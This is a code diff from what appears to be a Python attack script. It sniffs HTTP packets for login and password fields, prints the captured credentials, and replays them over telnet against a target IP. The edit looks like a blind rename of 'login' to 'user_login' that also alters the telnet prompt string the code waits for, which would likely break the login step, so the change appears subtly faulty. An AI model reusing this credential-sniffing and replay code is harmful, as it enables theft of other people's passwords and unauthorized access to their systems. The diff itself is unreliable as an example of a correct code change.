@@ -199,11 +199,11 @@ def use_telnet_credentials(login, password):
     for j in password:
         str_password = str_password + j
 
-    print("user login: " + str_login + "| user password: " + str_password)
+    print("user user_login: " + str_login + "| user user_password: " + str_password)
 
     try:
         tn = telnetlib.Telnet(target2_ip)
-        tn.read_until(b"login: ", 2)
+        tn.read_until(b"user_login: ", 2)
         tn.write(str_login.encode('ascii') + b"\n")
         tn.read_until(b"Password: ", 2)
         tn.write(str_password.encode('ascii') + b"\n")
@@ -296,7 +296,7 @@ def get_http_credentials(pkt):
         for k in range(get_index(full_str_credentials, password_field)+ len(password_field), len(full_str_credentials)):
             password = password + full_str_credentials[k]
 
-        print("user login: " + login + " | user password: " + password)
+        print("user user_login: " + login + " | user user_password: " + password)
         sys.exit(1)
 
     else:
